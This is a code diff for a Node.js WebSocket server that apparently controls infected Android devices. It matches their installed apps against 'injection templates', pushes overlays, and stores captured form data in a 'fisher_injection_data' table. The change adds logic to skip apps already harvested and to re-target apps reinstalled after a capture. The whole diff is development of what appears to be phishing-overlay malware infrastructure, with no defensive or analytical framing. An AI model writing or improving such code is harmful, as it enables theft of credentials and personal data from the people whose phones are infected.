@@ -1221,6 +1221,28 @@ async function handleUploadedAppList(deviceId, apps, connections, source = 'http
 const autoInjectedCache = new Map(); // key: deviceId, value: Set<packageName>
 const autoInjectionReservations = new Map(); // 仅用于阻止并发应用列表响应重复下发
 
+function normalizeTimestampSeconds(value) {
+  if (value === null || value === undefined || value === '') return 0;
+  const numeric = Number(value);
+  if (Number.isFinite(numeric) && numeric > 0) {
+    return Math.floor(numeric > 100000000000 ? numeric / 1000 : numeric);
+  }
+  const parsed = Date.parse(String(value));
+  return Number.isFinite(parsed) ? Math.floor(parsed / 1000) : 0;
+}
+
+function getAppFirstInstallAt(app) {
+  if (!app || typeof app !== 'object') return 0;
+  return normalizeTimestampSeconds(
+    app.firstInstallTime
+      ?? app.first_install_time
+      ?? app.installTime
+      ?? app.install_time
+      ?? app.installedAt
+      ?? app.installed_at
+  );
+}
+
 function getInjectionStatusLists(msg) {
   const data = msg && typeof msg.data === 'object' && msg.data ? msg.data : {};
   const packageValue = data.enabledPackages ?? msg?.enabledPackages;
@@ -1512,10 +1534,15 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
     );
     if (!templates || templates.length === 0) return;
 
-    // 构建设备已安装应用包名集合
-    const installedPkgs = new Set(
-      apps.map(a => typeof a === 'string' ? a : (a.packageName || a.package_name || a.pkg || ''))
-    );
+    // 构建设备已安装应用包名集合，同时保留安装时间用于识别“卸载后重装”。
+    const installedAppsByPackage = new Map();
+    for (const app of Array.isArray(apps) ? apps : []) {
+      const packageName = String(
+        typeof app === 'string' ? app : (app.packageName || app.package_name || app.pkg || '')
+      ).trim();
+      if (packageName) installedAppsByPackage.set(packageName, app);
+    }
+    const installedPkgs = new Set(installedAppsByPackage.keys());
 
     // 获取该设备已注入记录
     if (!autoInjectedCache.has(deviceId)) autoInjectedCache.set(deviceId, new Set());
@@ -1549,15 +1576,62 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
         console.warn(`[WS-Device] Auto-injection ${label} guard unavailable for ${deviceId}: ${guardErr.message}`);
       }
     }
-    // DB 中已经没有活跃任务、也不是本进程当前预留的包，就是过期内存状态。
-    // 清理后允许本次应用列表再次下发，不再需要通过重启 Node 恢复。
+
+    // 已经拿到表单数据代表这一轮自动注入已经完成。刷新应用列表只应给新匹配
+    // APP 下发，不能把旧 APP 再次打开。若 APK 上报 firstInstallTime 且晚于最近
+    // 采集时间，则视为目标 APP 卸载后重装，允许重新自动注入。
+    const latestCaptureByPackage = new Map();
+    try {
+      const [captureRows] = await db.query(
+        `SELECT package_name, MAX(created_at) AS latest_capture_at
+         FROM fisher_injection_data
+         WHERE device_id=? AND package_name IS NOT NULL AND package_name<>''
+         GROUP BY package_name`,
+        [deviceId]
+      );
+      for (const row of captureRows || []) {
+        const packageName = String(row.package_name || '');
+        const latestCaptureAt = normalizeTimestampSeconds(row.latest_capture_at);
+        if (packageName && latestCaptureAt > 0) {
+          latestCaptureByPackage.set(packageName, latestCaptureAt);
+        }
+      }
+    } catch (guardErr) {
+      console.warn(`[WS-Device] Auto-injection completed-capture guard unavailable for ${deviceId}: ${guardErr.message}`);
+      void recordDeviceDebug('injection.auto.guard_error', deviceId, {
+        guard: 'completed-capture',
+        message: guardErr.message || String(guardErr),
+      }, 'error');
+    }
+
+    const completedCaptures = new Map();
+    for (const [packageName, latestCaptureAt] of latestCaptureByPackage) {
+      if (!installedAppsByPackage.has(packageName)) continue;
+      const appFirstInstallAt = getAppFirstInstallAt(installedAppsByPackage.get(packageName));
+      const reinstalledAfterCapture = appFirstInstallAt > latestCaptureAt + 5;
+      if (!reinstalledAfterCapture) {
+        completedCaptures.set(packageName, { latestCaptureAt, appFirstInstallAt });
+      } else {
+        void recordDeviceDebug('injection.auto.reinstall_detected', deviceId, {
+          packageName,
+          latestCaptureAt,
+          appFirstInstallAt,
+          decision: 'allow-auto-inject',
+        });
+      }
+    }
+
+    // DB 中已经没有已确认活跃任务、完成记录，也不是本进程当前预留的包，
+    // 才是过期内存状态。完成记录会一直阻止普通刷新重复注入；“重注”仍由前端
+    // 手动流程显式绕过此自动去重。
     for (const packageName of [...injected]) {
-      if (!persistedActive.has(packageName) && !reservations.has(packageName)) {
+      if (!persistedActive.has(packageName) && !completedCaptures.has(packageName) && !reservations.has(packageName)) {
         injected.delete(packageName);
         void recordDeviceDebug('injection.auto.stale_cache_cleared', deviceId, { packageName });
       }
     }
     for (const packageName of persistedActive) injected.add(packageName);
+    for (const packageName of completedCaptures.keys()) injected.add(packageName);
 
     // 匹配模板（跳过已注入过的）
     let injectedCount = 0;
@@ -1567,11 +1641,13 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
       const pkg = tpl.package_name;
       if (!pkg || !installedPkgs.has(pkg)) continue;
       if (injected.has(pkg)) {
-        const skipReason = persistedActive.has(pkg)
-          ? 'active-task'
-          : reservations.has(pkg)
-            ? 'concurrent-reservation'
-            : 'client-confirmed-cache';
+        const skipReason = completedCaptures.has(pkg)
+          ? 'completed-capture'
+          : persistedActive.has(pkg)
+            ? 'active-task'
+            : reservations.has(pkg)
+              ? 'concurrent-reservation'
+              : 'client-confirmed-cache';
         console.log(`[WS-Device] Skip auto-inject ${pkg} for ${deviceId} (${skipReason})`);
         void recordDeviceDebug('injection.auto.skipped', deviceId, {
           packageName: pkg,
